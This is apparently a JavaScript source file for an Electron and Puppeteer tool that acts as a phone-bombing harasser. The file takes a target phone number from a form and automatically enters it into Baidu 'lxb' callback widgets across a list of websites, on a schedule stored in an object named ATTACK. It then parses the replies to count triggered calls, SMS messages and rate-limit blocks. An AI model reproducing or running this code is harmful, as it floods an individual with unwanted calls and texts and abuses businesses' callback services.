const app = require('electron').remote.app,
  // path = require('path'),
  fs = require('fs'),
  dialog = require('electron').remote.dialog,
  BrowserWindow = require('electron').remote.BrowserWindow,
  puppeteer = require('puppeteer');
const DATA = require('./data');
const target = {
  "phone": "",
  "name": "",
  "email": "",
  "address": "",
  "comment": "wwww"
}
// async function getPic(url) {
//   const browser = await puppeteer.launch({
//     headless: false,
//     slowMo: 250
//   });
//   const page = await browser.newPage();
//   await page.goto(url);
//   await page.setViewport({ width: 1200, height: 800 });
//   await page.screenshot({ path: 'google2.png' });

//   await browser.close();
// }
var TASK_STATUS = {
  done: 'done',
  locked: 'locked',
  failed: 'failed'
}
var ATTACK = {
  "times": 6,
  "time": "0 2 * * * *",
  "web_type": "baidu_lxb",
  "task_type": "call", // "comment"
  "interval": 30000
};
document.getElementById('count').innerText = DATA.length;
// 初始chrome
async function init (attack) {
  // const chromium = config.get('chromium');
  const browser = await puppeteer.launch({
    "slowMo": 100,
    "timeout": 3000,
    headless: false,
    "devtools": false
  });
  const page = await browser.newPage();
  page.setDefaultNavigationTimeout(30000);
  page.setViewport({width: 1024, height: 768});
  return {browser, page};
}
// 执行任务
async function task(page, item) {
  var result = {
    status: '',
    msg: ''
  };
  await page.goto(item.url);
  try {
      
    await page.type('.lxb-cb-input', target.phone, {delay: 10});
    await page.keyboard.press('Enter')
    await page.waitFor(1 * 1000);
    try {
      result.msg = await page.$eval('.lxb-cb-tip', e => e.innerText);
    } catch (e) {
        try {
            result.msg = await page.$eval('.lxb-cb-info-tip-con', e => e.innerText);
        } catch (e) {
            try {
                result.msg = await page.$eval('.lxb-cb-error-tip', e => e.innerText);
            } catch (e) {
                result.msg = `[MSG ERROR] ${e}`;
            }
        }
    }
  } catch (e) {
    result.msg = `[TYPE ERROR] ${e}`;
  }
  result.status = getTaskResult(result.msg);

  return result;
}

let index = 0;
async function run(attack) {
  const {browser, page} = await init(attack);
  let o = {};
  o[TASK_STATUS.done] = 0;
  o[TASK_STATUS.locked] = 0;
  o[TASK_STATUS.failed] = 0;

  for (let item of DATA) {
      index ++;
      let startTime = new Date();
      let sleepTime = attack.interval;

      console.log(`==================TASK TIMES: ${index}==================`.yellow)
      console.log(`TASK INFO:`.yellow, `WEB NAME: ${item.name} WEB TYPE: ${item.web_type}`.green);

      let result = await task(page, item);
      
      o[result.status] ++;
      if (result.status == TASK_STATUS.failed) {
        sleepTime = 0;
      } else {
          // url_list_to_save.push(item);
      }
      // let result = await task(page, item);

      // o[result.status] ++;

      // if (result.status == TASK_STATUS.failed) {
      //     sleepTime = 0;
      // } else {
      //     url_list_to_save.push(item);
      // }

      // console.log(`TASK RESULT:`.yellow, `STATUS: ${result.status} MSG:${result.msg}`.green);
      // console.log(`USED TIME: ${(new Date() - startTime) / 1000} S`.red);
      // console.log(`SLEEP TIME: ${sleepTime / 1000} S`.red);

      await page.waitFor(sleepTime);
  }

  await browser.close();
  // beforeExit();
  // console.log(`==================TASK REPORT==================`.yellow)
  // console.log(`done: ${o.done} failed: ${o.failed} locked: ${o.locked}`.yellow);
}
document.getElementById('start').addEventListener('click', function() {
  event.preventDefault();
  var phone = document.getElementById('phone').value
  var name = document.getElementById('name').value
  var email = document.getElementById('email').value
  var address = document.getElementById('address').value
  console.log(phone);
  target.phone = phone;
  (async () => {
      // console.log(config);
      await run(ATTACK);
  })();
  // console.log('start');
  // getPic('https://www.baidu.com');
});


function getTaskResult(text) {
  let status = TASK_STATUS.failed;
  let doneReg = /已短信提醒|正在呼叫|将给您回电|请准备接听/g;
  let lockedReg = /过于频繁|频繁/g;

  if (doneReg.test(text)) {
      status = TASK_STATUS.done;
  } else if (lockedReg.test(text)) {
      status = TASK_STATUS.locked;
  }

  return status;
}
